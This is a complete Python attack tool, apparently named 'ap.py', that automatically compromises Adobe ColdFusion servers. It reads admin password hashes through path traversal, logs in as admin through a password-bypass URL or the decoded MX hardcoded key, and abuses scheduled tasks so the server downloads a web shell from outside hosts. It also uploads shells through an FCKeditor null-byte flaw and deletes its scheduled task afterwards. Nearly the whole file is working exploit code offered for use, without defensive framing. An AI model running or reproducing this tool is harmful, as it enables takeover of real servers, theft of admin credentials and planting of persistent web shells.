import requests as r, hashlib, hmac, re, sys, socket

base = lambda x:'/'.join(x.split('/')[:3])
enter = lambda x: base(x) + '/CFIDE/Administrator/enter.cfm'
mappings = lambda x: base(x) + '/CFIDE/Administrator/settings/mappings.cfm'
schtask = lambda x: base(x) + '/CFIDE/Administrator/scheduler/scheduleedit.cfm'
lolpwn = lambda x: base(x) + '/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true'

upfile = 'i.cfm'
shfile = 'h.cfm'
localsh = 'h.cfm'
check = ['h.cfm', 'help.cfm']

debug_msg = False
headers = {"User-agent": "Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)"}

timeout=220

sta = lambda x: base(x) + '/CFIDE/' + upfile
sh = lambda x: base(x) + '/CFIDE/' + shfile

fckre = re.compile(r'url="(.+?)".+<Folders')
cfpre = re.compile(r'\npassword=(\S+)\r\n')

CFvulns = [
 ('/CFIDE/Administrator/logging/settings.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\JRun4\\servers\\cfusion\\cfusion-ear\\cfusion-war\\WEB-INF\\cfusion\\lib\\password.properties%00en', cfpre),
 ('/CFIDE/Administrator/logging/settings.cfm?locale=..\\..\\..\\..\\..\\..\\WEB-INF\\cfusion\\lib\\password.properties%00en', cfpre),
 ('/CFIDE/Administrator/logging/settings.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\ColdFusion8\\lib\\password.properties%00en', cfpre),
 ('/CFIDE/Administrator/logging/settings.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX7\\lib\\password.properties%00en', cfpre),
 ('/CFIDE/Administrator/logging/settings.cfm?locale=..\\..\\..\\..\\..\\..\\..\\..\\CFusionMX\\lib\\password.properties%00en', cfpre),
 ('/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/connector.cfm?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/', fckre)
 ]

def scan(host, vulns=CFvulns, timeout=timeout, verbose=False):
    if host == None:
        return None
    import requests as r
    for (url, match) in [('http://' + host + p[0], p[1]) for p in vulns]:
        if verbose:
            print "Trying: " + url
        try:
            resp = r.get(url, timeout=timeout, headers=headers)
        except:
            continue
        if re.search(match, resp.text):
            return (url, re.search(match, resp.text).groups()[0])

    if host == None:
        return None
    import requests as r
    for (url, match) in [('https://' + host + p[0], p[1]) for p in vulns]:
        if verbose:
            print "Trying: " + url
        try:
            resp = r.get(url, timeout=timeout, headers=headers)
        except:
            continue
        if re.search(match, resp.text):
            return (url, re.search(match, resp.text).groups()[0])

    return False


p1 = '/CFIDE/probe.cfm?name=%3Cb%3E%26%23181%3BSH%3C%2Fb%3E%22%3C%2Fh1%3E%3Ccfif%20isDefined(%22Form.File%22)%3E%3Ccftry%3E%3Ccffile%20action%3D%22upload%22%20destination%3D%22%23Expandpath(%22.%22)%23%22%20filefield%3D%22Form.File%22%20nameconflict%3D%22overwrite%22%3EY!%3Ccfcatch%3EN!%3C%2Fcfcatch%3E%3C%2Fcftry%3E%3C%2Fcfif%3E%3Cform%20method%3DPOST%20enctype%3D%22multipart%2Fform-data%22%3E%3Cinput%20type%3Dfile%20name%3D%22File%22%3E%3Cinput%20type%3Dsubmit%20value%3D%22Upload%22%3E%3C%2Fform%3E%3Cscript%3E'
p2, p3, p4 = ['http://www.veur-mekare.nl/xmlrpc/h.txt'] * 3
#p2 = 'http://www.veur-mekare.nl/xmlrpc/h.txt'
#p3 = 'http://74.209.245.208/CFIDE/helpmx.txt'
#p4 = 'http://76.12.24.9/CFIDE/sq.txt'

def ghs(url):
    try: 
        html = r.get(url, timeout=timeout, headers=headers).text
        hash = str(re.search('\npassword=(.+?)\r\n',html).groups()[0])
        if html.find('salt') > 0:
            salt = str(re.search('salt.+?type.+?value="(\d+?)"',html).groups()[0])
        else:
            salt = ''
        return (hash, salt)
    except: 
        return None

def cflogin(url, mx=False, LOL=False, hash=None, salt=None):
    if (LOL):
        try:
            resp = r.get(lolpwn(url),  headers=headers)
        except: return None
        if resp.text.find("boolean value='true'") > 0:
            debug(url,"[+] LOLwin!")
            return resp.cookies
        else:
            debug(url, "[-] LOLfail - status code: %d" % resp.status_code)
            
    else:
        if hash == salt == None:
            try: (hash, salt) = ghs(url)
            except: debug(url, "Could not get hash/salt" ); return None

        if (mx):
            admin_hmac = mxdecode(hash)
            debug(url, "[+] decrypted MX password: [%s]" % admin_hmac )
            if (salt != ''):
                debug(url, "[-] MX hash but salt provided. Get the new hash, stupid! " )
                return None
        else:
            admin_hmac = hmac.new(salt,hash,hashlib.sha1).hexdigest().upper()
            debug(url, "[+] hash: [%s] + salt: [%s] = hmac: [%s]" % (hash, salt, admin_hmac) )
        resp = r.post(enter(url),data={'cfadminUserId': 'admin', 'cfadminPassword': admin_hmac, 'salt': salt}, timeout=timeout, headers=headers)
        if not resp.text.find('Invalid') > 0:
            return resp.cookies
        elif resp.text.find('Invalid password'):
            debug(url, "Invalid password" )
        return None

debughtml = ''

def getmappings(url, cookies):
    global debughtml
    mapurl = mappings(url)
    try:
        resp = r.get(mapurl, cookies=cookies, timeout=timeout)#, headers=headers)
        debughtml=resp.text
        return re.findall(r'([^\t\n]+\\CFIDE) ?&nbsp;',resp.text)[0]
    except:
        #print "hmm: " + debughtml
        return None

def addtask(url, cookie, mapping, payload, fn, LOL=False):
    global debughtml
    token = ''
    if True:
        debug(url, "[-] getting CSRF token for schedule edit...")
        resp = r.post(schtask(url), cookies=cookie, data={'submit': 'Schedule New Task'}, headers=headers)
        if resp.text.find('csrftoken') > 0:
            try: token = re.findall(r"csrftoken..value=.([A-F0-9]+)", resp.text)[0]
            except: token = ""
            debug(url, "[+] got token:" + token)
            
        else:
            debug(url, "[-] token not found...")	
    task = {'Interval': 'Daily',
 'Operation': 'HTTPRequest',
 'ScheduleType': 'Once',
 'ScheduledURL': payload,
 'StartTimeOnce': '12:00 AM',
 'Start_Date': '1/3/37',
 'TaskName': 'cfProbe',
 'adminsubmit': 'Submit',
 'customInterval_hour': '0',
 'customInterval_min': '0',
 'customInterval_sec': '0',
 'publish': '1',
 'publish_file': mapping + '\\' + fn,
 'taskNameOrig': 'a',
 'csrftoken': token}
    try:
     resp = r.post(schtask(url), data=task, cookies=cookie, timeout=timeout, headers=headers)
    except:
        return None
    if resp.text.find('Run Scheduled Task') > 0:
        return True
    else: 
        debughtml = resp

def runtask(url, cookie):
    try:
        resp = r.get('/'.join(url.split('/')[:3]) + '/CFIDE/Administrator/scheduler/scheduletasks.cfm?runtask=cfProbe&timeout=0', cookies=cookie, timeout=timeout, headers=headers)
    except:
        return None
    if resp.text.find('Successful'):
	return True

def rmtask(url, cookie):
    if False:
        debug(url, "[-] getting CSRF token for schedule edit...")
        resp = r.post(schtask(url), cookies=cookie, data={'submit': 'Schedule New Task'}, headers=headers)
        if resp.text.find('csrftoken') > 0:
            token = re.findall(r"csrftoken..value=.([A-F0-9]+)", resp.text)[0]
            debug(url, "[+] got token:" + token)
        else:
            debug(url, "[-] token not found...")	
    try:
        resp = r.get( '/'.join(url.split('/')[:3]) + '/CFIDE/Administrator/scheduler/scheduletasks.cfm?action=delete&task=cfProbe', cookies=cookie, timeout=timeout, headers=headers)
        if resp.text.find('cfProbe') > 0:
            return False 
        else:
            return True
    except:
        return None

def checkup(url):
    try:
        resp = r.get(url, timeout=timeout, headers=headers)
    except:
        return None
    if resp.text.find('&#181;SH') > 0:
        return True
    else:
        return False

def checksh(url):
    try:
        resp = r.get(url, timeout=timeout, headers=headers)
    except:
        return None
    if resp.text.find('FileManager') > 0 or resp.text.find('Code:') > 0:
        return True
    else:
        return False    

def upsh(url):
    try:
        resp = r.post(url,files={'File': open(localsh,"rb")}, timeout=timeout, headers=headers)
    except:
        return None
    if resp.text.find('uploaded!') > 0:
        return True
    else:
        return resp.text
        
def pwnload(url, verbose=False):
    import requests as r; from random import randint as ri; url = url.split('?')[0]; lf = 'plan' + str(ri(0,60)) + '.cfm'
    try:
        resp = r.post(url + '?Command=FileUpload&Type=File&CurrentFolder=/' + lf + '%00',files={'newfile': open('logs/h.txt',"rb")}, timeout=timeout, headers=headers); # resp.text
    except: 
        return False
    meh = '/'.join(url.split('/')[:3]) + '/userfiles/file/' + lf; 
    debug(url, "Checking for shell at: %s" % meh)
    if checksh(meh):
        return meh
    else:
        return False

def exploit(url, cookie, mapping, payload, fn, LOL=False):
    if addtask(url, cookie, mapping, payload, fn, LOL=LOL): debug(url, "[+] task added!" )
    else: debug(url, "[-] failed to add task :(" ); #return None
    if runtask(url, cookie): debug(url, "[+] task executed!" )
    else: debug(url, "[-] failed to execute task :(" ); #return None
    if rmtask(url, cookie): debug(url, "[+] task deleted!" )
    else: debug(url, "[-] could not delete task: clean-up manually!" ); #return None    

def debug(url, line):
    global debug_msg
    if debug_msg:
        if url.find('/')>=0:
            url = url.split('/')[2]
        print "[%s] %s" % (url, line)
        sys.stdout.flush()
    
key = "\x3c\xb3\x7e\xfa\xe7\xf4\xf3\x76\xeb\xbd\x76\xcd\xfc\xe79" # coldfusion MX hardcoded key

def xor(key, cipher):
    max_len = max(len(key), len(cipher)) # get length of longest key or cipher
    key += chr(0) * (max_len - len(key)) # pad out to same length
    cipher += chr(0) * (max_len - len(cipher)) # pad out to same length 
    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(key, cipher)]) # made bitwise XOR
    
def mxdecode(hash,dbg=None):
    import binascii
    hash = re.compile("\\\\(.)").sub("\\1",hash.strip()) # strip newlines and replace \X with X 
    n = (((ord(hash[0])-32) & 63) * 4 + 5) / 3; cipher = binascii.a2b_uu(hash[:n]); n = len(cipher) # uudecode (with workaround) and get length of password
    decoded=xor(key, cipher)
    if dbg == "key":
        return key
    elif dbg == "cipher":
        return cipher
    return decoded[:n] # return substring length of password

def autopwn(url, verbose=False, reshell=False, mx=False, LOL=False, timeout=timeout):
    shloc = p3
	
    global DEBUG
    if verbose:
        DEBUG = True
    debug(url, "[ ] Trying to pwn [%s]" % url )
    
    if url.find('MX\\') > 0:
        mx = True
        
    if url.find('Administrator') < 0 and LOL==False:
		url = base(url) + '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/connector.cfm?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/'
		debug( url, "[ ] Attempting fckeditor connector upload..." )
		msh = pwnload(url, verbose=verbose)
		if msh:
			debug(url, "[+] big success! " + msh)
			return msh
		else:
			debug(url, "[-] Upload failed or directory not mapped :(")
			return False
    
    if not reshell:
        for oldsh in check:
            shurl = base(url) + '/CFIDE/' + oldsh
            debug(url, "[ ] check for shell at %s" % shurl )
            if checksh(shurl):
                debug(url, "[+] found existing shell %s" % shurl )
                return shurl
    yum = cflogin(url,mx=mx, LOL=LOL)
    if yum != None and 'CFAUTHORIZATION_cfadmin' in yum.keys(): debug(url, "[+] got admin cookie: %s" % yum['CFAUTHORIZATION_cfadmin'] )
    else: debug(url, "[-] login unsuccessful :(" ); return None
    mapping = getmappings(url, yum)
    if mapping != None: debug(url, "[+] got mapping: %s" % mapping )
    else: debug(url, "[-] could not get mapping :(" ); return None
    if (mx):
        exploit(url, yum, mapping, p3, shfile)
        if checksh(sh(url)): debug(url, "[+] remote shell drop succeeded! %s" % sh(url) ); return sh(url)
        else: debug(url, "[-] remote shell drop failed. hanging head in shame :(" ); return None
    elif not False:
        exploit(url, yum, mapping, base(url)+p1, upfile, LOL=LOL)
        if checkup(sta(url)): 
            debug(url, "[+] uploader     dropped!" )
            if upsh(sta(url)): debug(url, "[+] shell uploaded! %s" % sh(url) ); return sh(url)
            else: debug(url, "[-] shell upload failed :(" );
        else: 
            debug(url, "[-] probe request did not create uploader :( trying remote drop..." ); 
    exploit(url, yum, mapping, p4, shfile, LOL=LOL)
    if checksh(sh(url)): debug(url, "[+] remote shell drop succeeded! %s" % sh(url) ); return sh(url)
    else: debug(url, "[-] remote shell drop failed. hanging head in shame :(" ); return None

def valid_ip(x):
	return re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", x)

def valid_host(x):
	return re.match("^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\-]*[A-Za-z0-9])$", x)
	
def hailmary(target):
	global debug_msg
	if target:
		l = autopwn("http://" + target, LOL=True, verbose=debug_msg, timeout=2)
		if l: return l
		r = scan(target, timeout=2)
		if r: 	l = autopwn(r[0], verbose=debug_msg, reshell=True, timeout=2)
		if l: return l
	return None

def switchychangey(x):
	if valid_ip(x):
		try:
			return socket.gethostbyaddr(x)[0]
		except:
			return None
	elif valid_host(x):
		try:
			return socket.gethostbyname(x)
		except:
			return None
	else:
		return None

def dongs(x):
	if (valid_ip(x) or valid_host(x)):
		r = hailmary(x)
		if r:
			return r
		else:
			return hailmary(switchychangey(x))



if (__name__ == "__main__"):
	if(len(sys.argv) > 1):
		if(len(sys.argv) < 3 or sys.argv[2] != "quiet"):
			debug_msg = True
		print dongs(sys.argv[1])
	else:
		print "usage: ap.py host"
